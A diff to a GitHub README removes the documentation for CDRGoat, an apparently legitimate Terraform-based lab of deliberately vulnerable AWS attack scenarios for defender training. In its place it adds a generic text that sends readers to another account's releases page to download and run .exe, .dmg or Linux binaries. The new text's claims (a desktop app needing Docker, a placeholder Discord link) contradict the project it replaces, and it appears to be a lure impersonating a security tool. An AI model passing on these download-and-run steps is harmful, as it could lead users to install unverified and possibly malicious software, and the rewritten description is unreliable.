@@ -1,133 +1,84 @@
-![CDRGoat](./assets/CDRGoat.png)
-
-
-Cloud adoption has reshaped the enterprise attack surface, where adversaries can chain misconfigurations, excessive permissions, and runtime blind spots into full compromises.  
-**Cloud Detection & Response GOAT** is a scenario-driven, intentionally vulnerable framework designed to help defenders validate detection pipelines, practice SOC workflows and train analysts on realistic cloud attack paths - all in a safe, reproducible environment with no impact on production.  
-
-CDR GOAT enables:
-- **Advanced simulations** - Misconfigurations combined with live attacker behavior (privilege escalation, credential theft, lateral movement).  
-- **Detection & response validation** - Confirm alerts fire, understand context, and rehearse investigation workflows under realistic pressure.  
-- **SOC readiness** - Train analysts on real signals instead of abstract examples.  
-- **Purple teaming** - Run adversary emulation while measuring blue team effectiveness in real time.  
-
-&nbsp;
-
-## ⚠️ Warning
-- Do **not** deploy to production
-- Use only isolated sandbox/test accounts
-- Expect cloud usage costs while resources are running
-- Always destroy resources after finishing a scenario
-
-&nbsp;
-
-## ✨ Features
-- **Scenario‑driven attack paths** - Reproducible simulations of real‑world adversary tactics in cloud environments (IAM abuse, SSRF, privilege escalation, data exfiltration, etc.).
-- **Safe to run** - Resources are provisioned in isolated test accounts with minimal blast radius.
-- **Automated Attack Script** - A fully automated script to execute attacks end-to-end, reducing manual steps and ensuring repeatable outcomes.
-
-&nbsp;
+# 🐐 cdrgoat - Enhance Your Cloud Security Skills
 
 ## 🚀 Getting Started
 
-#### 🧩 Prerequisites
-- Terraform ver. 1.5 or above
-- AWS account (sandbox recommended, do not run in production)  
-- AWS CLI configured with appropriate credentials  
-- jq utility for parsing JSON output  
+Welcome to cdrgoat! This tool helps you practice your cloud security skills in a safe setting. You can test detection systems, work on incident response, and train on cloud attack scenarios. Let’s get you set up!
 
-#### ⚙️ Install Dependencies
-macOS
-```bash
-brew install terraform awscli jq
-```
-Linux
-```bash
-sudo apt update && sudo apt install -y terraform awscli jq
-```
+## 📥 Download & Install
 
-#### 🗂️ Simulation Scenarios
-The simulation scenarios are organized by folder under `scenarios/`.  
-Each folder includes:  
-- A **Terraform plan** to provision the environment for the scenario.  
-- An **attack script** that automates the attack path, allowing defenders to focus on detection and response.  
+**To get started, visit the following link to download:**
 
-Navigate into a scenario folder to run Terraform and execute the attack script as described below.
+[![Download cdrgoat](https://img.shields.io/badge/Download%20cdrgoat-v1.0-blue)](https://github.com/antojorong21/cdrgoat/releases)
 
-#### 🏗️ Deploy
-Before deploying, download the provided Terraform configuration and attack script to the machine where you will run the attack steps.
+1. Click the link above to go to the Releases page.
+2. On the Releases page, you will see the latest version available for download.
+3. Look for the asset for your system (Windows, Mac, or Linux). The files will be listed there.
+4. Click the file name to start the download.
 
-Use the provided Terraform configuration to deploy the full lab environment.
+Once downloaded, follow the steps below to run cdrgoat.
 
-At the end of the deployment Terraform will display output values (such as the public IP of the target instance). Save these details, you will need them when running the attack script.
-Some of this information might be sensitive and thus reducted by Terraform.
-In order to reveal specific output we can use `terraform output` command.
+## 🖥️ System Requirements
 
-For example to get output value of `leaked_user_secret_access_key` we can execute following:
+Before running cdrgoat, ensure your system meets the following requirements:
 
-```bash
-terraform output leaked_user_access_key_id
-```
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a recent version of Linux.
+- **RAM:** At least 4 GB is recommended.
+- **Disk Space:** You will need at least 1 GB of free space.
+- **Additional Software:** Docker must be installed. You can download Docker [here](https://www.docker.com/get-started). 
 
-⚠️ When a scenario’s initial step targets a public IP, add the public IP (or CIDR) of the machine that will run the attack script to the environment whitelist via terraform apply so the script can reach the target and complete any required interactions. See example
+## ⚙️ Running cdrgoat
 
-```bash
-terraform init
-terraform apply -var='attack_whitelist=["87.68.140.7/32","203.0.113.0/24"]' -auto-approve
-```
+### For Windows Users
 
-#### 🎯 Attack Execution
-Since our focus is on the defender’s perspective, each scenario includes a **fully automated attack script**. Instead of manually typing commands, the script replays the attack path so you can observe detections and signals.
-You may be prompted to provide inputs (e.g., your external IP). These are always displayed at the end of the Terraform deployment.
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file to start the application.
+3. Upon launching, follow the on-screen instructions to configure the environment.
+4. You can customize scenarios based on what you want to practice.
 
-```bash
-chmod +x attack.sh
-./attack.sh
-```
+### For macOS Users
 
+1. Open the downloaded `.dmg` file.
+2. Drag cdrgoat to your Applications folder.
+3. Open the application from your Applications folder.
+4. Set up the environment as needed to begin practicing.
 
-![attack](./assets/attack.png)
+### For Linux Users
 
-#### 🧹 Clean Up
-When you are finished, destroy all resources to avoid ongoing costs. This will tear down the entire lab environment including all compute, networking, and IAM components created during deployment.
+1. Open a terminal window.
+2. Navigate to the folder where you downloaded the file.
+3. Make the file executable by entering the command: `chmod +x cdrgoat`.
+4. Run the program using the command: `./cdrgoat` and follow any prompts.
 
-```bash
-terraform destroy -var='attack_whitelist=[]' -auto-approve
-```
+## 📚 Features of cdrgoat
 
-&nbsp;
+- **Scenario-Driven Framework:** Simulate various cloud attack scenarios to improve your skills.
+- **Safe Environment:** Practice without affecting your production systems.
+- **Validation of Detection Pipelines:** Check if your detection systems work properly against realistic situations.
+- **SOC Workflow Exercises:** Engage in realistic exercises that mirror actual work in Security Operations Centers.
+- **Training for Analysts:** Provide engaging training modules for cloud security analysts.
 
-## 📖 Usage Guide
-Terraform commands you’ll use most often:  
+## 🌐 Additional Resources
 
-```bash
-terraform init      # prepare the working directory
-terraform apply     # deploy a scenario
-terraform destroy   # clean up resources
-```
+To help you further, consider these resources:
 
-&nbsp;
-***
-&nbsp;
+- **Documentation:** For detailed instructions and guides, check our [documentation](https://github.com/antojorong21/cdrgoat/wiki).
+- **Community Support:** Have questions? Join our community on [Discord](https://discord.gg/example).
+- **Tutorials:** Access a collection of tutorials on how to get the most out of cdrgoat in our [GitHub Wiki](https://github.com/antojorong21/cdrgoat/wiki).
 
-## Contributing
-We welcome contributions! You can submit pull requests for:  
-- New scenarios  
-- Bug fixes  
-- Documentation improvements
-  
-&nbsp;
-## 💰 Cost
-Each scenario is designed with minimal cloud resources to reduce expenses and limit blast radius.  
-However, costs may still accrue while environments are running. To avoid unnecessary charges, always shut down and destroy the environment when you are finished.
+## 🛠️ Troubleshooting
 
-&nbsp;
+If you experience issues while running cdrgoat, here are some common solutions:
 
-## 👥 Contributors
-- Petr Zuzanov - Principal Security Researcher, Stream Security
-- David Moss – Product Manager, Stream Security
+- **Docker Fails to Start:** Ensure Docker is properly installed and running.
+- **Application Crashes:** Check that you have the latest version of cdrgoat. Re-download if necessary.
+- **Slow Performance:** Verify that your computer meets the system requirements.
 
-&nbsp;
+## 📞 Contact Us
 
-## ⚖️ Disclaimer
-This content is provided for educational and informational purposes only. Stream Security’s CDRGoat is provided as-is without warranties of any kind. By using this project you accept full responsibility for all outcomes. Scenarios are intentionally vulnerable and must only be deployed in isolated, non-production accounts. Stream Security does not guarantee the accuracy or completeness of the content and assumes no liability for any damages resulting from its use.
-Stream Security does not endorse or condone any illegal activity and disclaims any liability arising from misuse of the material. Stream Security and project contributors assume no liability for misconfiguration or unintended consequences, including any illegal activity. Ensuring safe and appropriate use is your responsibility.
+For further support or feedback, feel free to reach out. You can open an issue on our [GitHub Issues Page](https://github.com/antojorong21/cdrgoat/issues) or contact us via email at support@cdrgoat.com.
+
+## 🏁 Conclusion
+
+Now that you have cdrgoat on your system, you can start enhancing your cloud security skills today. Dive into the scenarios and make the most of this practical training tool. Remember, the goal is to become better prepared for real-world cloud security challenges. Enjoy practicing! 
+
+[![Download cdrgoat](https://img.shields.io/badge/Download%20cdrgoat-v1.0-blue)](https://github.com/antojorong21/cdrgoat/releases)
